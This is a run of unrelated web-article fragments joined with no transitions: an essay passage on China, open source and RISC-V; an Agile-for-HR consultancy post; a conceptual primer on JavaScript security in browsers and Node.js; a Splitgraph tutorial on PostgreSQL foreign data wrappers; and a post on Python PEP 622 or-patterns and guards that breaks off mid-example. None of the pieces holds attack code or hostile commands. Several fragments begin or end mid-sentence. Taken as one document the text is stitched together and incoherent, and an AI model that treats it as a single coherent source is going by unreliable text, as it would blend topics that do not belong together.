are on the U.S. export control entity list. The discussion inevitably leads to open source: are there open source alternatives to MATLAB? What about CAD softwares, like EDA tools, which every chip foundry needs? Will there be an open source EDA option?</p><p>Implicit in these discussions is a predominant “takers” mentality towards open source. In China, open source solutions are mostly seen as “free stuff” that you can take and use, without any expectation or incentive to give back (or in open source parlance: “contribute upstream”).</p><p>It’s already happening in RISC-V. Alibaba <a href="https://www.techspot.com/news/81177-china-alibaba-making-16-core-25-ghz-risc.html">sports the fastest RISC-V based processor to date</a>, but there’s no intention to my knowledge for the design to also be open-sourced or at least publicly shared for the benefit of the ecosystem. Many small startups in China, now showered with new investments, are doing the same -- using RISC-V to make special purpose chips that are effectively proprietary.</p><p><em>(This is not to generalize that all Chinese organizations are bad open source players; some are contributing a lot and have open source in their DNA. I’ve profiled many of the big tech firms and some startups from the lens in Part II of my “</em><a href="https://interconnected.blog/open-source-in-china-the-game/"><em>Open Source in China</em></a><em>” series.)</em></p><p><strong>If</strong> China hopes to evolve RISC-V into a more powerful, general-purpose building block to achieve semiconductor self-reliance, Chinese organizations, both individually and collectively, would have to shift from a zero-sum “takers” mentality to a positive-sum “stakeholders” mentality. What that means in reality is absorbing and practicing the open source way of doing things -- not just contributing code upstream and being more willing to share, but also behaviors like transparent governance, open discussions with other stakeholders and developers, and clear due process for decision-making, big and small. <strong>These are both technical and human complexities.</strong></p><p>With an existential struggle at hand, there’s reason to believe that Chinese companies may behave differently for the sake of achieving a national imperative and be less concerned about the tit-for-tat, zero-sum nature of market competition, which is quite cutthroat in China. And<strong> if done right</strong>, RISC-V could unleash massive technological innovation broadly and help China deal with its existential struggle specifically.</p><h2 id="foundries-smic-hsmc">Foundries: SMIC, HSMC</h2><p>Let’…</p></div></section></article></div></div></div>

Nowadays, political, social, and technological environments are evolving rapidly. Such changes create further risks and opportunities that may severely influence the way a company operates. For instance, as North American and European countries entered in lock down to combat the spread of the COVID-19 pandemic, several organizations were forced to make the move to remote working, despite not being prepared for it.&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; These massive disruptions have led some organizations to go under, while others fundamentally reinvented their operations to meet their strategic goals. In face of recent challenges, several companies have discovered that they need to be resilient, adaptive, and responsive. All such qualities serve as founding pillars to the Agile methodology, which has become increasingly attractive to companies by promoting faster deployment times and resilient workforces that are flexible and adaptive in the face of challenges and changes.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Arguably, a department that is in need of change in many organizations given recent and prior events is human resources (HR). HR is a key pillar in balancing organizational needs with employee’s priorities, helping to build, operate and foster incentive mechanisms and culture. Conversely, decisions made in areas such as prospecting, training, salary, and career development can heavily impact employee motivation and productivity. This incredibly delicate package can directly translate into a company’s ability to meet its strategic goals such as profitability, market share, productivity and sustainability.&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Traditionally, the HR department was governed by stiff protocols that were meant to instil policy alignment, control, and facilitate vertical structures. This style, often criticized as an obstacle to innovative thinking and resilient teams, has been under scrutiny by the business community in recent years. To bring human resources into the digital age, Agile has been identified by some as an ideal solution to create the right incentives necessary to ensure company success, even if partially implemented – Agile Lite (<a href="https://hbr.org/2018/03/the-new-rules-of-talent-management#hr-goes-agile">HR Goes Agile</a>, HBR).</p></div></div></div><div data-id="48430811" data-element_type="widget" data-widget_type="heading.default"><p><h2>Agile Driven Trends in HR</h2></p></div><div data-id="169f41f3" data-element_type="widget" data-widget_type="text-editor.default"><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unbeknownst to them, some companies have already started to implement Agile practices across their organization, while others have knowingly deployed Agile teams to test the waters. Nevertheless, in many well managed environments, such experiments have proven to be fruitful and have given way to innovative thinking and behaviour.</p></div></div><div data-id="62a25b3e" data-element_type="widget" data-widget_type="heading.default"><p><h3>External Talent Acquisition: Reactive vs. Proactive</h3></p></div><div data-id="5fb1805d" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Traditionally, the modus operandi for bringing new talent was, and still is in most enterprises, reactionary: as positions were made available, a formal search process started, from which a pool of applicants was formed. Once the ideal candidate was identified from the pool of applicants, an incentive package was negotiated and, finally, necessary organizational training was given. This talent acquisition style has its benefits as it ensures that the organization follows controls and policies, however, it can be very time consuming and not necessarily attract or select the best candidate for the position.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Agility driven talent acquisition practices understand the power that a company’s culture has to attract the right personnel. An agile talent acquisition staff becomes less reactive and more proactive in its operational handling. This means that the person is more in tune with the needs of their organization to appropriately forecast personnel needs – this can be done by maintaining a relationship with managers, understanding the turnover ratios on each department, and being attuned to the company’s demographics and needs (ex: what employees are expected to retire soon?).&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; By understanding the organization’s internal environment, talent acquisition members are then able to cultivate relationships across multiple channels (ex: LinkedIn and Universities) and expedite the hiring process should a position become available. It is important to note that this practice does not enforce or condone direct hiring. In fact, it is still advised that talent acquisition staff invite desired candidates to participate in formal hiring processes and, if all boxes are checked, then make an offer to the most qualified individual.</p></div></div></div><div data-id="2166be74" data-element_type="widget" data-widget_type="heading.default"><p><h3>Internal Talent Acquisition: Gigs and Projects</h3></p></div><div data-id="400b0a9" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Inevitably, as organizations’ needs and challenges change, new projects with differing or novel set of skills may appear. Depending on the complexity of the task, consultants or new talent may be brought in. However, for small and short-term projects, the procurement process for new talent or an agency may become too costly, or even risky. In some cases, the skills necessary to fulfill the project may be found in-house. Some forward looking, agility driven organizations have increased their workforce productivity by assigning short-term projects to employees with downtime. For example, should one department require assistance with the automation of a report, they may post the assignment in a board so other members of the company can apply to fulfill the request.</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Such practice has been implemented by the <a href="https://www.cppinvestments.com/">CPP Investment Board</a> and they call it <a href="https://cdn3.cppinvestments.com/wp-content/uploads/2020/05/cpp-investments-annual-report-2020-en.pdf">Gigs</a> (optional short-term assignments). Similar internal talent utilization may prove to be beneficial on several levels:</p><ul><li>It can further collaboration and a sense of community within the organization, which further strengthens corporate culture.</li><li>It can serve as a new challenge for employees who may find themselves underwhelmed by their current routine and wish to spice things up.</li><li>It may assist employees to acquire professional experience of skills that they previously viewed as hobbies (ex: graphical design or photography).</li><li>It may serve to further augment and sediment skills acquired through internal or external courses.</li><li>It can support an employee’s transition into a new career.</li></ul></div></div></div><div data-id="2578c15a" data-element_type="widget" data-widget_type="heading.default"><p><h3>Talent Management: Workforce Upskilling</h3></p></div><div data-id="1b44a92c" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Conventional talent management practices are typically owned by HR and focus on assigning static training for individuals who are preparing for new roles, are underperforming, or need to achieve a specific performance level in a desired practice (<a href="https://tech.gsa.gov/guides/applying_agile_practices_HR/#:~:text=According%20to%20the%20HR%20Trend,workforce%20fluctuations%20to%20demand%2C%20and">GSA</a>). This practice alone may not encourage innovative and proactive behaviour among the workforce and can even hurt engagement levels.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Recently, with technological advances in the are of online learning, Agility driven talent management practices are openly facilitated by HR to any employee who wishes to learn or hone a new skill. As such, internal learning portals are available (or the company has the choice to partner with institutions who offer such service) for employees to choose from a vast selection of topics which can be suggested to them according to identified best practices, or can be selected by them independent of their job. Agility driven HR has also found itself with a lot of untapped data that can be harnessed to drive personalized training. Technology is evolving at a rapid pace, causing organizations to consider workforce upskilling as a major driver in the digital age. HR departments that fail to transition at pace, or faster than its competitors may find itself scrambling compete.</p></div></div></div><div data-id="5131c56b" data-element_type="widget" data-widget_type="heading.default"><p><h2>Agile Framework Adapted to HR</h2></p></div><div data-id="2825630a" data-element_type="widget" data-widget_type="text-editor.default"><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Initially, Agile was a work methodology destined for software development. However, as time passed, other teams and departments started to retrofit its framework to their operations in the hopes of achieving similar results such as higher productivity, engagement, and efficiency. As explained in our previous article from the Agile series, <a href="https://gpetrium.com/agile-sales-department/">The Agile Sales Department</a>, Agile teams have 4 distinct roles: the team lead (in Scrum, also known as Scrum Master), team member, product owner, and stakeholder. Additionally, Agile practices are surrounded by ceremonies that instill team collaboration, autonomy and ownership to reach mutual objectives. Below, let us discuss how roles and ceremonies can both be adapted to further the HR department’s goals and objectives.</p></div></div><div data-id="460bba18" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <u>The HR Manager</u></strong> is usually tasked with many of the product owner activities. It can range from setting the vision for the team (alongside stakeholders such as Senior HR Manager and Managing Directors), setting priorities, anticipating stakeholder’s needs, overseeing progress, creating key strategic decisions and team targets. At the end of the cycle (or sprint), the HR manager will review the team’s progress and provide relevant guidance for future cycles. Although priorities may differ depending on the company and team, one of the key objectives in this role should be to provide targets and guidance for their HR team depending on their priorities – be it for the compensation team, benefits team, talent management and more.</p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <u>The Team Facilitator/ Coordinator</u></strong> serves as an intermediator who encourages the team to be the best they can be (balancing time, cost, and quality), while facilitating meetings, managing stakeholders, reinforcing objective oriented actions, and supporting team introspection. The team facilitator is also tasked with shielding the team from internal and external challenges that are not relevant to the current cycle’s objectives. This role is incredibly powerful even more so in organization who are testing the implementation of agile teams by introducing a few teams per department or project.</p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <u>Team Members</u></strong> are a group of 3-8 individuals, excluding the hr manager and the team facilitator. Their aim is to carry out the goals and objectives of the current cycle to the best of their ability in the allocated time and to take steps in preparation for future sprints.</p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <u>Stakeholders</u></strong> are other individuals with an interest, concern, or who are affected by the activities of …</p></div></div></div></div></div></div></div></div></section></div></div></div></div>

            <p>JavaScript has no security model. The runtime environments do. This post is a primer on how to think about JavaScript code security in Web browsers and Node.js.</p><p>JavaScript was created to add interactivity to HTML pages. Web browsers were the first runtime environment for JavaScript code.</p><p>When the user visits a Web page, the browser downloads the HTML code of that page and parses it to create the Document Object Model (DOM). The HTML contains information about other assets that need to be downloaded to render the page to the user. This includes stylesheets (CSS), images, other documents to display in frames, and many more.</p><p>The type of asset we are most interested in here is JavaScript code. It is also downloaded by the browser from locations referenced in the HTML.</p><h2 id="same-origin-policy">Same-Origin Policy</h2><p>Users can simultaneously visit many pages in tabs or separate browser windows. JavaScript code downloaded from multiple different sites is executed in the same browser.</p><p>One of those sites could be infected or operated by an attacker. Is this a risk? Could malicious code compromise the machine or steal data from other sites the user is browsing?</p><p>Browsers protect against this. Each Web site executes JavaScript code in a sandbox. Code downloaded from one Web site cannot read or write data from another site. It also cannot call functions or methods across different sites.</p><p>This is called the <a href="https://web.dev/same-origin-policy/">Same-origin policy</a> (SOP) and it is one of the most fundamental security policies on the Web.</p><h2 id="protecting-code-integrity">Protecting Code Integrity</h2><p>Attackers could breach the SOP through the injection of malicious code at the network level, making the injected code appear as coming from the legitimate site. Browsers use the <a href="https://web.dev/why-https-matters/">secure HTTPS protocol</a> to ensure JavaScript code is downloaded from the legitimate server and that the code is not tampered with in transit.</p><p>JavaScript is often distributed using Content Delivery Networks (CDN). Attackers capable of injecting content into the CDN could also compromise the SOP. <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity</a> (SRI) provides an additional level of protection that allows HTML code to be cryptographically bound to JavaScript code to prevent this.</p><p>Sandboxing is difficult to implement. Browsers use isolation mechanisms provided by the hardware and the operating system. JavaScript code from different sites is executed in separate processes.</p><p>The code in a sandbox is restricted in what it can do. It cannot directly access devices such as webcams or microphones. The filesystem and the local network are also not directly available.</p><p>JavaScript can use those resources only through very limited APIs. This reduces the attack surface. It also allows the browser to always ask the user for explicit permission before uploading files, capturing the webcam, or listening to the user’s microphone.</p><p>Node.js is a runtime environment for JavaScript based on the V8 engine built for the Google Chrome browser. It allows JavaScript code to be executed outside of the browser, typically on servers.</p><p>Node.js does not use the browser sandbox to run JavaScript. Security properties of both execution environments are different:</p><ul><li><strong>Origin</strong>. Browsers download the code and Node.js loads the code from local files like other popular programming languages.</li><li><strong>Trust</strong>. Browsers treat the code as untrusted and Node.js treats the code with full trust.</li><li><strong>Permissions</strong>. Browsers restrict capabilities the code has access to and Node.js grants all the privileges of the operating system account. This includes access to devices, files, and the local network.<br>Impact on Security</li></ul><p>The same JavaScript script or module can be executed in the browser or Node.js. Potential attacks may be different in both environments. The impact of successful exploits may be drastically different. It is very hard to reason about the security of JavaScript code without a specific execution environment in mind.</p><h2 id="browsers">Browsers</h2><p>A successful attack on JavaScript code running in the browser impacts a single user. The impact is limited to what the sandbox, browser APIs, and the user’s explicit consent allow for.</p><p>Compromised JavaScript script or module runs within the context of an authenticated session of the victim and it can perform actions on behalf of the user. In this scenario, the vulnerable code becomes an attack vector against Web applications the victim has legitimate access to.</p><h2 id="node-js">Node.js</h2><p>A successful attack on Node.js programs may impact the entire server the program runs on. The attacker may get access to all the resources the operating system account has access to, potentially leading to a full compromise of the server.</p><p>The next post in this series will demonstrate how the dynamic type system may lead to subtle security bugs.</p><!--kg-card-begin: html-->

They allow you to link a remote database to PostgreSQL and represent it as a set of foreign tables that behave like normal ones.</p><p>Imagine being able to run SQL on a MongoDB collection or querying MySQL data from your PostgreSQL instance. Or, imagine running a <code>JOIN</code> between an SQLite file and an Oracle cluster without having to write and maintain an ETL job.</p><p>In this article, we'll discuss PostgreSQL foreign data wrappers and how <a href="https://www.splitgraph.com/" as="https://www.splitgraph.com/">Splitgraph</a> makes it much easier for anyone to use them.</p></section><section><h2 id="using-a-custom-fdw-with-splitgraph">Using a custom FDW with Splitgraph</h2><p>This example (<a href="https://github.com/splitgraph/splitgraph/tree/master/examples/custom_fdw" as="https://github.com/splitgraph/splitgraph/tree/master/examples/custom_fdw">source code on GitHub</a>) will show you how to write a custom <a href="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction" as="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction">foreign data wrapper</a> using Multicorn. <a href="https://github.com/Segfault-Inc/Multicorn" as="https://github.com/Segfault-Inc/Multicorn">Multicorn</a> is a PostgreSQL extension that makes it possible to write foreign data wrappers in Python.</p><p>We will then integrate it with Splitgraph's <a href="https://www.splitgraph.com/docs/sgr/data-import-export/mount" as="https://www.splitgraph.com/docs/sgr/data-import-export/mount"><code>sgr mount</code></a> command. This will make it queryable from the Splitgraph engine and allow Splitgraph to use it in <a href="https://www.splitgraph.com/docs/concepts/splitfiles" as="https://www.splitgraph.com/docs/concepts/splitfiles">Splitfiles</a>.</p><p>In particular, we will be running a foreign data wrapper that queries the <a href="https://github.com/HackerNews/API" as="https://github.com/HackerNews/API">Firebase Hacker News API</a>. This will let us run SQL queries on the top, best and new stories from Hacker News, as well as Show HNs and Ask HNs.</p><p>This foreign data wrapper returns a list of rows from the remote database without performing any filtering. However, Multicorn also passes qualifiers and sort keys to the Python extension. This allows filtering to happen on the remote database as well, if it supports it.</p><p>To run this demo, you will need to have <a href="https://www.docker.com/get-started" as="https://www.docker.com/get-started">Docker</a> and <a href="https://docs.docker.com/compose/install/" as="https://docs.docker.com/compose/install/">Docker Compose</a>.</p><section><h3 id="clone-the-repository">Clone the repository</h3><p>Clone Splitgraph and go to the <a href="https://github.com/splitgraph/splitgraph/tree/master/examples/custom_fdw" as="https://github.com/splitgraph/splitgraph/tree/master/examples/custom_fdw">example project</a>:</p><pre><code metastring=""><span><span>$</span> <span><span>git</span> clone https://github.com/splitgraph/splitgraph.git</span></span>

</span></code></pre></section></section><section><h2 id="what-are-foreign-data-wrappers">What are foreign data wrappers?</h2><p>The easiest way to describe foreign data wrappers is by considering UNIX files. A UNIX file isn't always pointing to a local file on your disk. It could be a file stored on NFS, in a remote S3 bucket or even a shim that lets you manipulate a device on your machine.</p><p>In UNIX, a file is a pretty strong abstraction that doesn't get broken. An IDE doesn't need to know that the file it's editing is on a remote filesystem. It can work with it by issuing the same ordinary read and write calls. Someone who writes a new filesystem doesn't need to make sure that it's compatible with all existing tools. Instead, they can write a driver that mounts the filesystem to a mountpoint.</p><p>PostgreSQL FDWs resemble mounting in that respect. Foreign tables mostly behave like normal tables and can receive the same <code>SELECT/INSERT/UPDATE/DELETE</code> queries. Behind the scenes, the wrapper's only job is to emit tuples.</p></section><section><h2 id="why-should-i-use-fdws">Why should I use FDWs?</h2><p>Foreign data wrappers are a great alternative to ETL. Instead of loading data into your warehouse that you might never use, you can mount the remote database and query it on demand.</p><p>Because they integrate with the PostgreSQL query planner, FDWs have a decent performance. The FDW can push down qualifiers and even aggregations to the remote database. FDWs can report the rough costs of starting a scan and fetching a tuple back to the query planner. This lets the query planner choose, for example, whether running multiple small single scans or one big one is a better strategy for satisfying a JOIN.</p><p>It's straightforward to write your own FDW and the <a href="https://www.postgresql.org/docs/12/fdwhandler.html" as="https://www.postgresql.org/docs/12/fdwhandler.html">PostgreSQL documentation</a> covers it extensively. The <a href="https://github.com/wikrsh/hello_fdw/" as="https://github.com/wikrsh/hello_fdw/">hello-world FDW</a> that returns "Hello, World" in a table is only a couple hundred lines of C code. If you prefer to focus on development simplicity, you can use Multicorn instead of raw C.</p><p>There are plenty of open-source foreign data wrappers available. They let you query other RDBMSs, NoSQL databases, CSV files or column stores. The <a href="https://wiki.postgresql.org/wiki/Foreign_data_wrappers" as="https://wiki.postgresql.org/wiki/Foreign_data_wrappers">PostgreSQL wiki</a> lists some of them.</p><p>Using a foreign data wrapper for your database or data source gives you access to a huge ecosystem of software that works with PostgreSQL. We can almost call this a network effect. A new data source that is accessible via an FDW enhances everything that works with PostgreSQL.</p></section><section><h2 id="why-use-fdws-with-splitgraph">Why use FDWs with Splitgraph?</h2><p><a href="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction" as="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction">Foreign data wrappers</a> are one of the ways that Splitgraph aims to make data engineers' and data scientists' work easier.</p><p>Splitgraph's <a href="https://www.splitgraph.com/docs/sgr/data-import-export/mount" as="https://www.splitgraph.com/docs/sgr/data-import-export/mount"><code>sgr mount</code></a> command handles the boilerplate around FDW initialization.

<p><a href="https://www.python.org/dev/peps/pep-0622/">PEP 622</a> proposes adding a pattern matching construct to Python. Pattern matching allows the programmer to destructure data with a syntax that mirrors the construction syntax. The proposal brings Python in-line with many other modern programming languages, like Haskell, OCaml, and Rust. However, two features included in the proposal (or-patterns and guards) interact in a perhaps surprising way—see <a href="https://hal.inria.fr/hal-01413241/document">this paper</a> for an explanation of this interaction as it relates to OCaml, another language with both or-patterns and guards.</p>

<p>You can try out an in-progress implementation of this PEP at this fork of cpython: <a href="https://github.com/brandtbucher/cpython/tree/patma">https://github.com/brandtbucher/cpython/tree/patma</a>.</p>

<p>In the rest of this post, I’ll briefly summarize pattern matching, define or-patterns and guards, and show the surprising behavior in the context of Python.</p>

<h2 id="example-of-pattern-matching">Example of pattern matching</h2>

<p>Before the proposal, here’s how you might write a function that classifies a pair of animals according to their kind</p>

<div><div><pre><code><span>class</span> <span>Dog</span><span>:</span>
  <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
    <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

<span>class</span> <span>Cat</span><span>:</span>
  <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>age</span><span>):</span>
    <span>self</span><span>.</span><span>age</span> <span>=</span> <span>age</span>

<span>def</span> <span>classify</span><span>(</span><span>pet</span><span>):</span>
  <span>if</span> <span>isinstance</span><span>(</span><span>pet</span><span>,</span> <span>Cat</span><span>):</span>
    <span>print</span><span>(</span><span>"A cat that's {} years old"</span><span>.</span><span>format</span><span>(</span><span>pet</span><span>.</span><span>age</span><span>))</span>
  <span>elif</span> <span>isinstance</span><span>(</span><span>pet</span><span>,</span> <span>Dog</span><span>):</span>
    <span>print</span><span>(</span><span>"A dog named {}"</span><span>.</span><span>format</span><span>(</span><span>pet</span><span>.</span><span>name</span><span>))</span>

<span>classify</span><span>(</span><span>Dog</span><span>(</span><span>"Fido"</span><span>))</span>
<span># prints: A dog named Fido
</span>
<span>classify</span><span>(</span><span>Cat</span><span>(</span><span>3</span><span>))</span>
<span># prints: A cat that's 3 years old
</span></code></pre></div></div>

<p>Under the proposal, this is how you could write <code>classify</code>:</p>

<div><div><pre><code><span>def</span> <span>classify</span><span>(</span><span>pet</span><span>):</span>
  <span>match</span> <span>pet</span><span>:</span>
    <span>case</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>):</span>
      <span>print</span><span>(</span><span>"A cat that's {} years old"</span><span>.</span><span>format</span><span>(</span><span>age</span><span>))</span>
    <span>case</span> <span>Dog</span><span>(</span><span>name</span><span>=</span><span>name</span><span>):</span>
      <span>print</span><span>(</span><span>"A dog named {}"</span><span>.</span><span>format</span><span>(</span><span>name</span><span>))</span>
</code></pre></div></div>

<p>In other words, pattern matching allows you to inspect a piece of data and simultaneously match its shape and bind the value of its fields to variables. In the above code, <code>Cat(age=age)</code> is a <em>pattern</em> that <em>matches</em> <code>Cat</code> values, and <em>binds</em> to the variable named <code>age</code>.</p>

<p>The proposal gives an informal description of the semantics of this construct, but the informal description doesn’t explain the interaction between two of the introduced features: or-patterns, and pattern guards. As it turns out, as currently implemented, the interaction between these features is somewhat surprising, and will probably yield at least one high-scoring Stack Overflow question if this PEP ends up being accepted.</p>

<h2 id="or-patterns">Or-patterns</h2>

<p>Here is an example of an or-pattern: <code>Cat(age=3) | Dog(name="Fido")</code>. This pattern matches either three-year-old cats or dogs named Fido. In practice:</p>

<div><div><pre><code><span># I have a three-year-old cat and a dog named Fido.
# This function returns true if the pet could be mine.
</span><span>def</span> <span>couldBeMyPet</span><span>(</span><span>pet</span><span>):</span>
  <span>match</span> <span>pet</span><span>:</span>
    <span>case</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>3</span><span>)</span> <span>|</span> <span>Dog</span><span>(</span><span>name</span><span>=</span><span>"Fido"</span><span>):</span>
      <span>return</span> <span>True</span>
    <span>case</span> <span>_</span><span>:</span>
      <span>return</span> <span>False</span>

<span>print</span><span>(</span><span>couldBeMyPet</span><span>(</span><span>Cat</span><span>(</span><span>3</span><span>)))</span>
<span># prints True
</span>
<span>print</span><span>(</span><span>couldBeMyPet</span><span>(</span><span>Dog</span><span>(</span><span>"Rover"</span><span>)))</span>
<span># prints False
</span></code></pre></div></div>

<h2 id="pattern-guards">Pattern guards</h2>

<p>Pattern guards are boolean expressions that can be included in a <code>case</code> branch; the case branch is only taken if the pattern guard evaluates to true.</p>

<div><div><pre><code><span>def</span> <span>classify</span><span>(</span><span>pet</span><span>):</span>
  <span>match</span> <span>pet</span><span>:</span>
    <span>case</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>)</span> <span>if</span> <span>age</span> <span>%</span> <span>2</span> <span>==</span> <span>0</span><span>:</span>
      <span>print</span><span>(</span><span>"This cat has an even age!"</span><span>)</span>
    <span>case</span> <span>Dog</span><span>(</span><span>name</span><span>=</span><span>name</span><span>)</span> <span>if</span> <span>sorted</span><span>(</span><span>name</span><span>)</span> <span>==</span> <span>list</span><span>(</span><span>name</span><span>):</span>
      <span>print</span><span>(</span><span>"This dog's name is in alphabetical order!"</span><span>)</span>
    <span>case</span> <span>_</span><span>:</span>
      <span>print</span><span>(</span><span>"I have nothing interesting to say about this pet."</span><span>)</span>

<span>classify</span><span>(</span><span>Cat</span><span>(</span><span>4</span><span>))</span>
<span># prints "This cat has an even age!"
</span>
<span>classify</span><span>(</span><span>Dog</span><span>(</span><span>"abe"</span><span>))</span>
<span># prints "This dog's name is in alphabetical order!"
</span>
<span>classify</span><span>(</span><span>Dog</span><span>(</span><span>"fido"</span><span>))</span>
<span># prints "I have nothing interesting to say about this pet."
</span></code></pre></div></div>

<p>In the above example, <code>if age % 2 == 0</code> and <code>if sorted(name) == list(name)</code> are pattern guards that allow that case to be taken only if that boolean expression evaluates to True.</p>

<h2 id="the-surprising-interaction">The surprising interaction</h2>

<p>What do you think this function does?</p>

<div><div><pre><code><span>def</span> <span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>pet1</span><span>,</span> <span>pet2</span><span>):</span>
  <span>match</span> <span>(</span><span>pet1</span><span>,</span> <span>pet2</span><span>):</span>
    <span>case</span> <span>(</span><span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>),</span> <span>_</span><span>)</span> <span>|</span> <span>(</span><span>_</span><span>,</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>))</span> <span>if</span> <span>age</span> <span>%</span> <span>2</span> <span>==</span> <span>0</span><span>:</span>
      <span>return</span> <span>True</span>
    <span>case</span> <span>_</span><span>:</span>
      <span>return</span> <span>False</span>

<span>print</span><span>(</span><span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>Cat</span><span>(</span><span>2</span><span>),</span> <span>Cat</span><span>(</span><span>4</span><span>)))</span>
<span># prints True
</span>
<span>print</span><span>(</span><span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>Cat</span><span>(</span><span>2</span><span>),</span> <span>Cat</span><span>(</span><span>5</span><span>)))</span>
<span># prints True
</span>
<span>print</span><span>(</span><span>doesEitherCatHaveAnEvenAge</span><span>(</span><span>Cat</span><span>(</span><span>5</span><span>),</span> <span>Cat</span><span>(</span><span>4</span><span>)))</span>
<span># prints False (?????)
</span></code></pre></div></div>

<p>The last one (<code>doesEitherCatHaveAnEvenAge(Cat(5), Cat(4))</code>) may seem like it should evaluate to True. After all, the one of the patterns in the or-pattern seems like it matches the second cat, which is a cat with an even age.</p>

<p>Does <code>(Cat(5), Cat(4))</code> match against <code>(Cat(age=age), _) | (_, Cat(age=age)) if age % 2 == 0</code>? To answer this question, the semantics in your head might look something like this:</p>

<ol>
  <li>Well, <code>(Cat(5), Cat(4))</code> does match agains the first pattern of the or-pattern, <code>(Cat(age=age), _)</code>. This match binds the value 5 to the variable <code>age</code>.</li>
  <li>Now we check the guard <code>if age % 2 == 0</code>. Because <code>5 % 2 == 0</code> evaluates to False, this check fails.</li>
  <li>Go back to the or-pattern and see if there’s any other way to match it. In this case, <code>(Cat(5), Cat(4))</code> also matches the second pattern of the or-pattern, <code>(_, Cat(age=age)</code>. This binds the value 4 to the variable <code>age</code>.</li>
  <li>Now the guard <code>if age % 2 == 0</code> succeeds, because <code>4 % 2 == 0</code> evaluates to <code>True</code>.</li>
  <li>Because this case matches the value, we return True.</li>
</ol>

<p>This is perfectly sensible, but this is not what the implementation does. The implementation’s semantics are more like this:</p>

<ol>
  <li>Same as step 1 from above.</li>
  <li>Same as step 2 from above.</li>
  <li>Because the guard failed, the case isn’t taken! Instead, the next case is tried. This case (<code>case _:</code>) always succeeds, so we return False.</li>
</ol>

<p>In other words, pattern matching does’t have backtracking semantics, even if a value can match an or-pattern in multiple different ways.</p>

<p>I love pattern matching, and I’m excited to see that it might be adopted by such a popular language as Python. But this particular interaction of features might confuse novices. Let’s compare the approaches of other languages.</p>

<p>OCaml has the same semantics as Python here, but the OCaml compiler can emit a warning (because the compiler has enough type information to figure out whether the constituent patterns of an or-pattern can possibly match the same value in different ways).</p>

<div><div><pre><code><span>let</span> <span>()</span> <span>=</span>
  <span>match</span> <span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span> <span>with</span>
  <span>|</span> <span>(</span><span>x</span><span>,</span> <span>_</span><span>)</span> <span>|</span> <span>(</span><span>_</span><span>,</span> <span>x</span><span>)</span> <span>when</span> <span>x</span> <span>=</span> <span>2</span> <span>-&gt;</span> <span>print_endline</span> <span>":)"</span>
  <span>|</span> <span>_</span> <span>-&gt;</span> <span>print_endline</span> <span>":("</span>
<span>;;</span>
</code></pre></div></div>

<p>This prints <code>:(</code>, but also emits the warning:</p>

<div><div><pre><code>Warning 57: Ambiguous or-pattern variables under guard;
variable x may match different arguments. (See manual section 9.5)
</code></pre></div></div>

<p>Rust has pattern matching and guards, and has an experimental <code>or_patterns</code> feature. It implements backtracking semantics, unlike Python. This is weird in its own right, especially in the presence of side effects. Take a look at this program:</p>

<div><div><pre><code><span>#![feature(or_patterns)]</span>

<span>// Prompt the user whether they want to accept the match</span>
